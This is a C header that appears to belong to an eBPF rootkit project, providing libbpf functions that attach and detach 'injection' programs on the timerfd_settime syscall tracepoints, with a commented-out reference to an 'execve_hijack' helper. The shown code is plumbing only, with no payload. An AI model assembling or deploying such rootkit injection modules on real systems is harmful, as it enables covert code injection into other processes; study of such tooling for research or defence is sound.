#ifndef __MOD_INJECTION_H
#define __MOD_INJECTION_H

#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "kit.skel.h"
#include "common.h"

//Connections
int attach_sys_enter_timerfd_settime(struct kit_bpf *skel){
    //skel->links.kprobe_sys_geteuid = bpf_program__attach_uprobe(skel->progs.uprobe_execute_command, false, -1, "/home/osboxes/TFG/src/helpers/execve_hijack", 4992);
	skel->links.sys_enter_timerfd_settime = bpf_program__attach(skel->progs.sys_enter_timerfd_settime);
    return libbpf_get_error(skel->links.sys_enter_timerfd_settime);
}
int attach_sys_exit_timerfd_settime(struct kit_bpf *skel){
	skel->links.sys_exit_timerfd_settime = bpf_program__attach(skel->progs.sys_exit_timerfd_settime);
    return libbpf_get_error(skel->links.sys_exit_timerfd_settime);
}

int attach_injection_all(struct kit_bpf *skel){
    return attach_sys_enter_timerfd_settime(skel)
        || attach_sys_exit_timerfd_settime(skel);;
}


int detach_sys_enter_timerfd_settime(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.sys_enter_timerfd_settime);
    if(err<0){
        fprintf(stderr, "Failed to detach injection link\n");
        return -1;
    }
    return 0;
}
int detach_sys_exit_timerfd_settime(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.sys_exit_timerfd_settime);
    if(err<0){
        fprintf(stderr, "Failed to detach injection link\n");
        return -1;
    }
    return 0;
}

int detach_injection_all(struct kit_bpf *skel){
    return detach_sys_enter_timerfd_settime(skel)
        || detach_sys_exit_timerfd_settime(skel);
}

#endif